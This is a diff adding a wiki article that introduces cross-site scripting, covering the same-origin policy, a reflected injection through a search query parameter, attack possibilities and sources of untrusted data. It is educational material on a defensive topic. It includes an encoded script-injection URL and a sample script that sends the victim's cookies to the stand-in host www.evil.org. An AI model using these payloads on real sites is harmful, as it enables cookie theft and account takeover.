@@ -1,0 +1,89 @@
+#summary Introduction to Cross-Site Scripting Vulnerabilities.
+#labels about-security,is-article
+#sidebar TOCArticlesXSS
+
+||[EsArticleIntroductionToXSS Español]||[JaArticleIntroductionToXSS 日本語]||[FrArticleIntroductionToXSS Français]||
+||[Welcome Home]||||[ArticlesXSS Web Security]||
+
+Web browsers implement a so-called [http://www.mozilla.org/projects/security/components/same-origin.html Same Origin Policy] with respect to the access rights of script (such as JavaScript or VBScript) contained in a document loaded from a particular domain.  Essentially, script can only access properties (including cookies and DOM objects and their attributes) associated with the same domain as the one from which the document containing the script was loaded.  This policy is necessary to prevent script in a page loaded from e.g. domain `www.evil.org` to access `google.com` cookies.
+
+However, suppose it is possible for a page loaded from `www.evil.org` to cause a document to be loaded from a URL in the `google.com` domain such that this document contains script of `evil.org`'s choosing.  Then this script would be able to e.g. access and steal `google.com` cookies.  The exploit would be triggered anytime a victim views the malicious page on `evil.org`.
+
+== Example Vulnerability ==
+
+How could a page on `www.evil.org` make this happen?
+
+Suppose there's a URL on Google's site, `http://www.google.com/search?q=flowers`, which returns HTML documents containing the fragment
+{{{
+...
+  <p>Your search for 'flowers' returned the following results:</p>
+...
+
+}}}
+
+i.e., the value of the query parameter `q` is inserted into the page returned by Google.  Suppose further that the data is not validated, filtered or escaped.
+
+Evil.org could put up a page that causes the following URL to be loaded in the browser (e.g., in an invisible `<iframe>`):
+{{{
+http://www.google.com/search?q=flowers+%3Cscript%3Eevil_script()%3C/script%3E
+}}}
+
+When a victim loads this page from `www.evil.org`, the browser will load the iframe from the URL above.  The document loaded into the iframe will now contain the fragment
+{{{
+<p>Your search for 'flowers <script>evil_script()</script>'
+   returned the following results:</p>
+
+}}}
+
+Loading this page will cause the browser to execute `evil_script()`.  Furthermore, this script will execute in the context of a page loaded from `www.google.com`!
+
+== XSS Exploits and Payloads ==
+
+What evil things could this script do?  There are several possibilities.
+
+=== Stealing Cookies ===
+
+The attacker could insert
+{{{
+<script>
+  i=new Image();
+  i.src="http://www.evil.org/snarf?cookie=" + escape(document.cookie);
+</script>
+}}}
+
+This would cause the browser to make a request to evil.org's server that includes in the URL the victim's Google cookies.  I.e., the attacker will find the victim's Google cookie in their webserver log.
+
+For example, if the stolen cookies included all of the victim user's GMail cookies (assuming the victim was logged into GMail at the time they visited evil.org's page), then the attacker could paste those cookies into their own browser, and then have full access to the victim's GMail account.
+
+== Scripting the Vulnerable Application ==
+
+If the attacker does not want to steal the cookie and directly access the application (e.g., GMail) using that cookie (maybe they want to avoid leaving their IP address in GMail's logs), they can still do a lot of damage.  They could inject script that performs actions (such as sending an email, loading an email and posting the contents to evil.org's site, etc) within the context of the victim user's session.
+
+An interesting example of such an exploit is the "Samy" worm that was released on the MySpace social networking site.  The worm used a XSS vulnerability on MySpace's site to add users as friends of one user ('Samy'), and to propagate through the network of friend-relations on MySpace.
+
+== Modifying the Application's UI ==
+
+A third possibility would be for the attacker to script modifications to a page loaded from the vulnerable site, which in this case would be intended to be viewed by the victim and presumably be part of a social engineering type attack (perhaps trying to get the victim to disclose their password or credit card number).
+
+There've been demonstration exploits for vulnerable news sites, where the injected script was used to overlay a bogus news story on top of the site's UI.
+
+== Sources of Untrusted Data ==
+
+In the example above, the vector via which the attacker was able to inject malicious script into a document viewed by the victim was a query parameter on a URL of the vulnerable application.
+
+Query parameters (or Form fields) are a common and often most easily exploited XSS vector.  However, any data that may be under the control of an attacker and which is inserted into HTML documents must be considered for XSS vulnerabilities.  Sources of such data include, but are not limited to:
+
+  * Query parameters in the URL
+  * The path of the URL (may be echoed as part of "Document not found" error messages)
+  * Form fields (including hidden fields)
+  * Cookies
+  * Other parts of the HTTP request header (such as the referrer URL)
+  * Data that was inserted into a data store in an earlier transaction, possibly by a different user (e.g. messages in Google Groups, Orkut, GMail).
+  * Data obtained from a datafeed (e.g. merchant feeds in Google Product Search)
+  * Data crawled from the web (Google Search) or the local disk (Google Desktop)
+
+== Further reading ==
+
+  * [ArticleXSS Everything you ever wanted to know about cross-site scripting (XSS) attacks]
+  * [http://www.mozilla.org/projects/security/components/same-origin.html Same Origin Policy]
+  * [http://it.slashdot.org/it/05/10/14/126233.shtml Cross-Site Scripting Worm Floods MySpace (slashdot.org)]
